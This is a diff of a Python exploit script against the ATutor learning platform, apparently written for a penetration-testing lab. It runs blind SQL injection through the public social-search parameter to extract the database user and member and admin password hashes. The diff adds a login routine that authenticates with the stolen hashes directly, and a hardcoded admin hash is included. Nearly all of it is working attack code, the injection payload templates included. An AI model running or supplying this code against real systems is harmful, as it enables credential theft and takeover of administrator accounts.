@@ -1,27 +1,12 @@
 import sys
 import re
 import requests
+import hashlib
 from bs4 import BeautifulSoup
 
 ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
 # List of characters in (rough) order of frequency
 # Numbers, small letters, punctuation, big letters (from 32 to 127)
-
-def searchFriends_custom(ip, inj_str):
-    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
-    r = requests.get(target)
-    s = BeautifulSoup(r.text, 'lxml')
-    print ("Response Headers:")
-    print (r.headers)
-    print()
-    print ("Response Content:")
-    print (s.text)
-    print ()
-    error = re.search("Invalid argument", s.text)
-    if error:
-        print ("Errors found in response. Possible SQL injection found")
-    else:
-        print ("No errors found")
 
 def searchFriends_sqli(ip, inj_str):
     target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
@@ -35,7 +20,7 @@ def searchFriends_sqli(ip, inj_str):
     else:
         return True
 
-def extract(ip, inj):
+def extract_data(ip, inj):
     template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
 
     output = "" # If we already have stuff, can start output with value and change starting i
@@ -56,25 +41,32 @@ def extract(ip, inj):
     print(f"Extracted data: {output}")
     return output
 
+def login(ip, username, user_hash):
+    target = f"http://{ip}//ATutor/login.php"
+    token = "token"
+    hashed = hashlib.sha1((user_hash + token).encode('utf-8'))
+
+    data = {
+        "submit": "Login",
+        "form_login": username,
+        "form_password_hidden": hashed.hexdigest(),
+        "token":token
+    }
+    s = requests.Session()
+    r = s.post(target, data=data)
+    res = r.text
+
+    if re.search("Invalid login/password combination.",res):
+        return False
+    return True
+
 def main():
-    if len(sys.argv) != 3:
-        print ("(+) usage: %s <target> <injection_string>" % sys.argv[0])
-        print ('(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0])
+    if len(sys.argv) != 2:
+        print ("(+) usage: %s <target>" % sys.argv[0])
+        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
         sys.exit(-1)
 
-    ip                  = sys.argv[1]
-    injection_string    = sys.argv[2]
-
-    true_injection_string = "aaaa')/**/or/**/(select/**/1)=1%23"
-    false_injection_string = "aaaa')/**/or/**/(select/**/1)=0%23"
-    
-    user_injection_string = "select/**/CURRENT_USER()"
-    # To extract the username (root@localhost):
-    # extract_data(ip, user_injection_string)
-
-    version_injection_string = "select/**/version()"
-    # To extract the version (5.5.47-0+deb8u1-log)
-    # extract_data(ip, version_injection_string)
+    ip = sys.argv[1]
 
     member_username_injection_string = "select/**/login/**/FROM/**/AT_members"
     # member_username = extract_data(ip, member_username_injection_string)
@@ -93,6 +85,9 @@ def main():
     # admin_hash = extract_data(ip, admin_password_injection_string)
     admin_hash = "f865b53623b121fd34ee5426c792e5c33af8c227"
     print(f"Extracted Credentials: {admin_username}, {admin_hash}")
+
+    print(login(ip, member_username, member_hash))
+    print(login(ip, admin_username, admin_hash))
 
 if __name__ == "__main__":
     main()
